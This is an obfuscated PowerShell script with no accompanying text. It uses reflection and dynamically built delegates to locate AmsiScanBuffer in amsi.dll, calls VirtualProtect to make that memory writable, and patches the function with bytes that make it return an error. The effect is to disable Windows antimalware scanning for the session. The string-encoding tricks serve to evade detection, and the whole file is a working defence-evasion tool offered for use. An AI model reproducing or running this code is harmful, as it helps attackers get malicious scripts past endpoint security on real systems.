function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split($($syncThisID="";$pingThisConn=144;$getIntegerProvider = @('ec');$(($getIntegerProvider[0] + " " + $getIntegerProvider[0]).split(" ").forEach({[char]([convert]::toint16($_,16) - $pingThisConn)}).forEach({$syncThisID=$syncThisID+$_});$syncThisID);))[-1].
     Equals($($syncIResponse="";$removeSearchFunction=248;$removeIFactory = @('126', '14b', '15c', '15d', '164', '165', '16b', '16c', '171');$(($removeIFactory[1] + "#" + $removeIFactory[8] + "#" + $removeIFactory[6] + "#" + $removeIFactory[7] + "#" + $removeIFactory[3] + "#" + $removeIFactory[5] + "#" + $removeIFactory[0] + "#" + $removeIFactory[2] + "#" + $removeIFactory[4] + "#" + $removeIFactory[4]).split("#").forEach({[char]([convert]::toint16($_,16) - $removeSearchFunction)}).forEach({$syncIResponse=$syncIResponse+$_});$syncIResponse);))
     }).GetType($($pingFirstName="";$listIntegerObject=249;$pushLegacyData = @('127', '12b', '12c', '146', '147', '14e', '150', '15a', '15c', '15d', '15e', '15f', '161', '162', '167', '168', '16b', '16c', '16d', '16f');$(($pushLegacyData[3] + ":" + $pushLegacyData[13] + ":" + $pushLegacyData[8] + ":" + $pushLegacyData[16] + ":" + $pushLegacyData[15] + ":" + $pushLegacyData[17] + ":" + $pushLegacyData[15] + ":" + $pushLegacyData[11] + ":" + $pushLegacyData[18] + ":" + $pushLegacyData[0] + ":" + $pushLegacyData[6] + ":" + $pushLegacyData[13] + ":" + $pushLegacyData[14] + ":" + $pushLegacyData[2] + ":" + $pushLegacyData[1] + ":" + $pushLegacyData[0] + ":" + $pushLegacyData[5] + ":" + $pushLegacyData[14] + ":" + $pushLegacyData[17] + ":" + $pushLegacyData[7] + ":" + $pushLegacyData[11] + ":" + $pushLegacyData[10] + ":" + $pushLegacyData[4] + ":" + $pushLegacyData[7] + ":" + $pushLegacyData[18] + ":" + $pushLegacyData[13] + ":" + $pushLegacyData[19] + ":" + $pushLegacyData[10] + ":" + $pushLegacyData[3] + ":" + $pushLegacyData[10] + ":" + $pushLegacyData[18] + ":" + $pushLegacyData[12] + ":" + $pushLegacyData[15] + ":" + $pushLegacyData[9] + ":" + $pushLegacyData[17]).split(":").forEach({[char]([convert]::toint16($_,16) - $listIntegerObject)}).forEach({$pingFirstName=$pingFirstName+$_});$pingFirstName);))
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -like $($syncInterfaceID="";$pingBooleanID=191;$deleteRenewalEntity = @('e9', '106', '10f', '122', '123', '124', '12e', '131', '132');$(($deleteRenewalEntity[1] + "=" + $deleteRenewalEntity[5] + "=" + $deleteRenewalEntity[0] + "=" + $deleteRenewalEntity[2] + "=" + $deleteRenewalEntity[0] + "=" + $deleteRenewalEntity[6] + "=" + $deleteRenewalEntity[3] + "=" + $deleteRenewalEntity[0] + "=" + $deleteRenewalEntity[4] + "=" + $deleteRenewalEntity[4] + "=" + $deleteRenewalEntity[7] + "=" + $deleteRenewalEntity[5] + "=" + $deleteRenewalEntity[8] + "=" + $deleteRenewalEntity[8]).split("=").forEach({[char]([convert]::toint16($_,16) - $pingBooleanID)}).forEach({$syncInterfaceID=$syncInterfaceID+$_});$syncInterfaceID);)) {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod($($pushRenewalRequest="";$cacheCompanyReq=253;$shareRenewalFunction = @('144', '145', '14a', '15e', '161', '162', '169', '16b', '16c', '171', '172');$(($shareRenewalFunction[0] + "-" + $shareRenewalFunction[5] + "-" + $shareRenewalFunction[9] + "-" + $shareRenewalFunction[2] + "-" + $shareRenewalFunction[8] + "-" + $shareRenewalFunction[4] + "-" + $shareRenewalFunction[10] + "-" + $shareRenewalFunction[6] + "-" + $shareRenewalFunction[5] + "-" + $shareRenewalFunction[1] + "-" + $shareRenewalFunction[3] + "-" + $shareRenewalFunction[7] + "-" + $shareRenewalFunction[4] + "-" + $shareRenewalFunction[6] + "-" + $shareRenewalFunction[5]).split("-").forEach({[char]([convert]::toint16($_,16) - $cacheCompanyReq)}).forEach({$pushRenewalRequest=$pushRenewalRequest+$_});$pushRenewalRequest);))).Invoke($null,
@($moduleName)), $functionName))
}


function getDelegateType {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName($($syncCompanyFactory="";$setLastObject=78;$syncLastConnection = @('92', 'a0', 'af', 'b1', 'b2', 'b3', 'b4', 'b5', 'ba', 'c2');$(($syncLastConnection[1] + "=" + $syncLastConnection[5] + "=" + $syncLastConnection[6] + "=" + $syncLastConnection[8] + "=" + $syncLastConnection[5] + "=" + $syncLastConnection[3] + "=" + $syncLastConnection[9] + "=" + $syncLastConnection[5] + "=" + $syncLastConnection[4] + "=" + $syncLastConnection[0] + "=" + $syncLastConnection[5] + "=" + $syncLastConnection[8] + "=" + $syncLastConnection[5] + "=" + $syncLastConnection[7] + "=" + $syncLastConnection[2] + "=" + $syncLastConnection[9] + "=" + $syncLastConnection[5]).split("=").forEach({[char]([convert]::toint16($_,16) - $setLastObject)}).forEach({$syncCompanyFactory=$syncCompanyFactory+$_});$syncCompanyFactory);))),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule($($syncRenewalAssets="";$syncBooleanConnection=118;$pushOldProvider = @('bf', 'c3', 'da', 'db', 'e2', 'e3', 'e4', 'e5', 'e8', 'eb', 'ef');$(($pushOldProvider[0] + " " + $pushOldProvider[6] + " " + $pushOldProvider[1] + " " + $pushOldProvider[3] + " " + $pushOldProvider[5] + " " + $pushOldProvider[7] + " " + $pushOldProvider[8] + " " + $pushOldProvider[10] + " " + $pushOldProvider[1] + " " + $pushOldProvider[7] + " " + $pushOldProvider[2] + " " + $pushOldProvider[9] + " " + $pushOldProvider[4] + " " + $pushOldProvider[3]).split(" ").forEach({[char]([convert]::toint16($_,16) - $syncBooleanConnection)}).forEach({$syncRenewalAssets=$syncRenewalAssets+$_});$syncRenewalAssets);), $false).
    DefineType($($pingCurrentID="";$removeIntegerWildcard=222;$pingIItem = @('122', '12b', '132', '13f', '143', '145', '14a', '14e', '152', '157');$(($pingIItem[1] + "*" + $pingIItem[9] + "*" + $pingIItem[0] + "*" + $pingIItem[4] + "*" + $pingIItem[6] + "*" + $pingIItem[4] + "*" + $pingIItem[5] + "*" + $pingIItem[3] + "*" + $pingIItem[8] + "*" + $pingIItem[4] + "*" + $pingIItem[2] + "*" + $pingIItem[9] + "*" + $pingIItem[7] + "*" + $pingIItem[4]).split("*").forEach({[char]([convert]::toint16($_,16) - $removeIntegerWildcard)}).forEach({$pingCurrentID=$pingCurrentID+$_});$pingCurrentID);), $($updateEmptyReq="";$validateMyReq=145;$removeCompanyEntity = @('9b', 'b1', 'bd', 'd2', 'd4', 'e1', 'e4', 'f2', 'f3', 'f4', 'f5', 'f6', 'fa', 'fd', 'ff', '100', '104', '105', '106');$(($removeCompanyEntity[4] + "/" + $removeCompanyEntity[13] + "/" + $removeCompanyEntity[7] + "/" + $removeCompanyEntity[16] + "/" + $removeCompanyEntity[16] + "/" + $removeCompanyEntity[2] + "/" + $removeCompanyEntity[1] + "/" + $removeCompanyEntity[5] + "/" + $removeCompanyEntity[18] + "/" + $removeCompanyEntity[8] + "/" + $removeCompanyEntity[13] + "/" + $removeCompanyEntity[12] + "/" + $removeCompanyEntity[9] + "/" + $removeCompanyEntity[2] + "/" + $removeCompanyEntity[1] + "/" + $removeCompanyEntity[6] + "/" + $removeCompanyEntity[11] + "/" + $removeCompanyEntity[7] + "/" + $removeCompanyEntity[13] + "/" + $removeCompanyEntity[11] + "/" + $removeCompanyEntity[10] + "/" + $removeCompanyEntity[2] + "/" + $removeCompanyEntity[1] + "/" + $removeCompanyEntity[3] + "/" + $removeCompanyEntity[14] + "/" + $removeCompanyEntity[16] + "/" + $removeCompanyEntity[12] + "/" + $removeCompanyEntity[4] + "/" + $removeCompanyEntity[13] + "/" + $removeCompanyEntity[7] + "/" + $removeCompanyEntity[16] + "/" + $removeCompanyEntity[16] + "/" + $removeCompanyEntity[2] + "/" + $removeCompanyEntity[0] + "/" + $removeCompanyEntity[1] + "/" + $removeCompanyEntity[1] + "/" + $removeCompanyEntity[1] + "/" + $removeCompanyEntity[1] + "/" + $removeCompanyEntity[3] + "/" + $removeCompanyEntity[18] + "/" + $removeCompanyEntity[17] + "/" + $removeCompanyEntity[15] + "/" + $removeCompanyEntity[4] + "/" + $removeCompanyEntity[13] + "/" + $removeCompanyEntity[7] + "/" + $removeCompanyEntity[16] + "/" + $removeCompanyEntity[16]).split("/").forEach({[char]([convert]::toint16($_,16) - $validateMyReq)}).forEach({$updateEmptyReq=$updateEmptyReq+$_});$updateEmptyReq);), [System.MulticastDelegate])

  $type.
    DefineConstructor($($shareTableAssets="";$cacheIndexService=247;$shareLastData = @('117', '123', '139', '13f', '145', '147', '149', '14a', '14b', '158', '159', '15a', '15b', '15c', '15e', '160', '163', '164', '167', '16c', '170');$(($shareLastData[6] + "*" + $shareLastData[8] + "*" + $shareLastData[7] + "*" + $shareLastData[18] + "*" + $shareLastData[13] + "*" + $shareLastData[11] + "*" + $shareLastData[15] + "*" + $shareLastData[9] + "*" + $shareLastData[16] + "*" + $shareLastData[4] + "*" + $shareLastData[9] + "*" + $shareLastData[17] + "*" + $shareLastData[13] + "*" + $shareLastData[1] + "*" + $shareLastData[0] + "*" + $shareLastData[3] + "*" + $shareLastData[15] + "*" + $shareLastData[12] + "*" + $shareLastData[13] + "*" + $shareLastData[2] + "*" + $shareLastData[20] + "*" + $shareLastData[7] + "*" + $shareLastData[15] + "*" + $shareLastData[14] + "*" + $shareLastData[1] + "*" + $shareLastData[0] + "*" + $shareLastData[5] + "*" + $shareLastData[19] + "*" + $shareLastData[10] + "*" + $shareLastData[16] + "*" + $shareLastData[15] + "*" + $shareLastData[11]).split("*").forEach({[char]([convert]::toint16($_,16) - $cacheIndexService)}).forEach({$shareTableAssets=$shareTableAssets+$_});$shareTableAssets);),
[System.Reflection.CallingConventions]::Standard, $func).
     SetImplementationFlags($($shareLegacyRepository="";$retrieveOnEntity=37;$shareStringWildcard = @('45', '51', '72', '77', '86', '89', '8a', '8c', '8e', '92', '93', '99', '9a');$(($shareStringWildcard[3] + "/" + $shareStringWildcard[12] + "/" + $shareStringWildcard[10] + "/" + $shareStringWildcard[11] + "/" + $shareStringWildcard[8] + "/" + $shareStringWildcard[9] + "/" + $shareStringWildcard[6] + "/" + $shareStringWildcard[1] + "/" + $shareStringWildcard[0] + "/" + $shareStringWildcard[2] + "/" + $shareStringWildcard[4] + "/" + $shareStringWildcard[10] + "/" + $shareStringWildcard[4] + "/" + $shareStringWildcard[7] + "/" + $shareStringWildcard[6] + "/" + $shareStringWildcard[5]).split("/").forEach({[char]([convert]::toint16($_,16) - $retrieveOnEntity)}).forEach({$shareLegacyRepository=$shareLegacyRepository+$_});$shareLegacyRepository);))

  $type.
    DefineMethod($($pushLegacyProvider="";$listMyObject=255;$popNewRepository = @('148', '164', '16a', '16d', '16e', '175');$(($popNewRepository[0] + "*" + $popNewRepository[3] + "*" + $popNewRepository[5] + "*" + $popNewRepository[4] + "*" + $popNewRepository[2] + "*" + $popNewRepository[1]).split("*").forEach({[char]([convert]::toint16($_,16) - $listMyObject)}).forEach({$pushLegacyProvider=$pushLegacyProvider+$_});$pushLegacyProvider);), $($removeTheConn="";$retrieveBooleanService=247;$createSearchRequest = @('117', '123', '139', '13f', '145', '147', '14a', '14d', '158', '159', '15a', '15b', '15c', '15e', '160', '163', '166', '169', '16b', '16c', '16e', '170');$(($createSearchRequest[5] + "/" + $createSearchRequest[19] + "/" + $createSearchRequest[9] + "/" + $createSearchRequest[15] + "/" + $createSearchRequest[14] + "/" + $createSearchRequest[10] + "/" + $createSearchRequest[1] + "/" + $createSearchRequest[0] + "/" + $createSearchRequest[3] + "/" + $createSearchRequest[14] + "/" + $createSearchRequest[11] + "/" + $createSearchRequest[12] + "/" + $createSearchRequest[2] + "/" + $createSearchRequest[21] + "/" + $createSearchRequest[6] + "/" + $createSearchRequest[14] + "/" + $createSearchRequest[13] + "/" + $createSearchRequest[1] + "/" + $createSearchRequest[0] + "/" + $createSearchRequest[4] + "/" + $createSearchRequest[12] + "/" + $createSearchRequest[20] + "/" + $createSearchRequest[6] + "/" + $createSearchRequest[15] + "/" + $createSearchRequest[16] + "/" + $createSearchRequest[18] + "/" + $createSearchRequest[1] + "/" + $createSearchRequest[0] + "/" + $createSearchRequest[7] + "/" + $createSearchRequest[14] + "/" + $createSearchRequest[17] + "/" + $createSearchRequest[18] + "/" + $createSearchRequest[19] + "/" + $createSearchRequest[8] + "/" + $createSearchRequest[15]).split("/").forEach({[char]([convert]::toint16($_,16) - $retrieveBooleanService)}).forEach({$removeTheConn=$removeTheConn+$_});$removeTheConn);), $delType,
$func). SetImplementationFlags($($shareLegacyRepository="";$retrieveOnEntity=37;$shareStringWildcard = @('45', '51', '72', '77', '86', '89', '8a', '8c', '8e', '92', '93', '99', '9a');$(($shareStringWildcard[3] + "/" + $shareStringWildcard[12] + "/" + $shareStringWildcard[10] + "/" + $shareStringWildcard[11] + "/" + $shareStringWildcard[8] + "/" + $shareStringWildcard[9] + "/" + $shareStringWildcard[6] + "/" + $shareStringWildcard[1] + "/" + $shareStringWildcard[0] + "/" + $shareStringWildcard[2] + "/" + $shareStringWildcard[4] + "/" + $shareStringWildcard[10] + "/" + $shareStringWildcard[4] + "/" + $shareStringWildcard[7] + "/" + $shareStringWildcard[6] + "/" + $shareStringWildcard[5]).split("/").forEach({[char]([convert]::toint16($_,16) - $retrieveOnEntity)}).forEach({$shareLegacyRepository=$shareLegacyRepository+$_});$shareLegacyRepository);))
    return $type.CreateType()
}


$a=$($deleteFirstID="";$createCurrentWildcard=178;$validateTheRequest = @('f3');$(($validateTheRequest[0]).split("=").forEach({[char]([convert]::toint16($_,16) - $createCurrentWildcard)}).forEach({$deleteFirstID=$deleteFirstID+$_});$deleteFirstID);)
$b=$($getThatWildcard="";$setLegacyService=49;$putCurrentName = @('84', '9a', '9e', 'a4');$(($putCurrentName[2] + "=" + $putCurrentName[3] + "=" + $putCurrentName[1] + "=" + $putCurrentName[0]).split("=").forEach({[char]([convert]::toint16($_,16) - $setLegacyService)}).forEach({$getThatWildcard=$getThatWildcard+$_});$getThatWildcard);)
$c=$($popSearchConn="";$getInterfaceMap=172;$putTheItem = @('ee', '10d', '10f', '11a');$(($putTheItem[2] + "#" + $putTheItem[1] + "#" + $putTheItem[3] + "#" + $putTheItem[0]).split("#").forEach({[char]([convert]::toint16($_,16) - $getInterfaceMap)}).forEach({$popSearchConn=$popSearchConn+$_});$popSearchConn);)
$d=$($listSearchResponse="";$cacheTheEntity=117;$getInterfaceAssets = @('da', 'db', 'e7', 'ea');$(($getInterfaceAssets[3] + ";" + $getInterfaceAssets[1] + ";" + $getInterfaceAssets[1] + ";" + $getInterfaceAssets[0] + ";" + $getInterfaceAssets[2]).split(";").forEach({[char]([convert]::toint16($_,16) - $cacheTheEntity)}).forEach({$listSearchResponse=$listSearchResponse+$_});$listSearchResponse);)
[IntPtr]$funcAddr = LookupFunc amsi.dll ($a+$b+$c+$d)
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 12)
